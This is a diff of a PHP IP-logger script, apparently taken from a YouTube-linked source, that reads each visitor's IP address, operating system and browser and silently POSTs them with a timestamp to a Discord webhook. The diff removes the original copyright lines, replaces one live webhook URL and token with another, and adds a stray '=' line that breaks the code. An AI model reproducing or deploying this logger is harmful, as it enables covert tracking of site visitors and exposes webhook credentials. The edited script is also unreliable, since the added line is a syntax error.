@@ -1,5 +1,4 @@
 <?php
-// © COPYRIGHT 2020 - Les Batcodes - https://youtu.be/QnA2N21vrCU
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
 function getOS() { 
     global $user_agent;
@@ -79,8 +78,7 @@ else{
 date_default_timezone_set('TIMEZONE');//<------------     Time Zone here      https://www.php.net/manual/en/timezones.php
 $time = date('Y-m-d H:i:s');
 $make_json = json_encode(array ('content'=>"$ip | $user_os | $user_browser | $time\n"));
-$exec = curl_init("https://discordapp.com/api/webhooks/748528292721721504/tFzgq--cZEkdapx4ln9Q6Kc6JW1gm2q3VembMKfmGrcgTteFRUKmsWMIOkc4uSX4BLeC");         //<------------     WEBHOOK HERE                                                                               <-----------      WEBHOOK ON THIS LINE
-// © COPYRIGHT 2020 - Les Batcodes - https://youtu.be/QnA2N21vrCU
+$exec = curl_init("https://discord.com/api/webhooks/843383763975274536/jciqdMSEw6jHHeF_Dg_IAdfjS38Bmedmhq_JtzH4pb975tnaT3hLcHSwQZFt52ujEQN9");         //<------------     WEBHOOK HERE                                                                               <-----------      WEBHOOK ON THIS LINE
 curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
 curl_setopt( $exec, CURLOPT_POST, 1);
 curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
@@ -88,5 +86,5 @@ curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt( $exec, CURLOPT_HEADER, 0);
 curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
 $response = curl_exec( $exec );
-// © COPYRIGHT 2020 - Les Batcodes - https://youtu.be/QnA2N21vrCU
+=
 ?>
